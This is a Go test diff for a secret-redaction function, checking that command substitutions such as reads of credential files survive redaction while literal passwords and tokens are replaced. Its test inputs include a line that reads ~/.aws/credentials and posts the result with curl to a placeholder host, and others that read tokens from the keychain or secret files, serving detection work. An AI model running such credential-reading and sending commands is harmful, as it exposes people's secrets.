@@ -1038,3 +1038,38 @@ func TestTruncateStringIsAlwaysValidUTF8WithinTheLimit(t *testing.T) {
 		}
 	}
 }
+
+// A label followed by a command substitution holds no secret: the secret is what the command
+// prints when the line runs. Replacing the unquoted value took the command's name and nothing
+// else, which hid nothing, left a line that no longer parses, and removed what a detection rule
+// reads: which command read which credential. The opening is kept when it is a plain command name
+// or path; anything else after `$(`, a quoted value, and a `$VARIABLE` are replaced as before.
+func TestRedactStringKeepsTheCommandOfASubstitution(t *testing.T) {
+	for input, want := range map[string]string{
+		`TOKEN=$(cat ~/.aws/credentials); curl -d "$TOKEN" https://x`:  `TOKEN=$(cat ~/.aws/credentials); curl -d "$TOKEN" https://x`,
+		`export GITHUB_TOKEN=$(gh auth token)`:                         `export GITHUB_TOKEN=$(gh auth token)`,
+		`API_KEY=$(</run/secrets/api-key) ./deploy`:                    `API_KEY=$(</run/secrets/api-key) ./deploy`,
+		`DB_PASSWORD=$(pwgen) ./seed`:                                  `DB_PASSWORD=$(pwgen) ./seed`,
+		`curl -H "Authorization: Bearer $(cat ~/.token)" https://x`:    `curl -H "Authorization: Bearer $(cat ~/.token)" https://x`,
+		`deploy --token $(/usr/bin/security find-generic-password -w)`: `deploy --token $(/usr/bin/security find-generic-password -w)`,
+
+		// What the kept command is given is still redacted by the rule for it.
+		`TOKEN=$(curl -u me:hunter2 https://x)`:          `TOKEN=$(curl -u me:[REDACTED] https://x)`,
+		`TOKEN=$(vault login --token s3cr3t-val -quiet)`: `TOKEN=$(vault login --token [REDACTED] -quiet)`,
+		// Not a plain command name: arithmetic, a list, an assignment.
+		`PASSWORD=$((1+2))`:            `PASSWORD=[REDACTED]`,
+		`PASSWORD=$(a;b)`:              `PASSWORD=[REDACTED]`,
+		`TOKEN=$(API_KEY=abc123 gen)`:  `TOKEN=[REDACTED] gen)`,
+		`TOKEN=$GITHUB_TOKEN`:          `TOKEN=[REDACTED]`,
+		`TOKEN=${GITHUB_TOKEN}`:        `TOKEN=[REDACTED]`,
+		`export TOKEN="$(cat ~/.tok)"`: `export TOKEN="[REDACTED]"`,
+	} {
+		got := RedactString(input)
+		if got != want {
+			t.Errorf("RedactString(%q)\n  got  %q\n  want %q", input, got, want)
+		}
+		if again := RedactString(got); again != got {
+			t.Errorf("RedactString(%q) is not stable: %q then %q", input, got, again)
+		}
+	}
+}
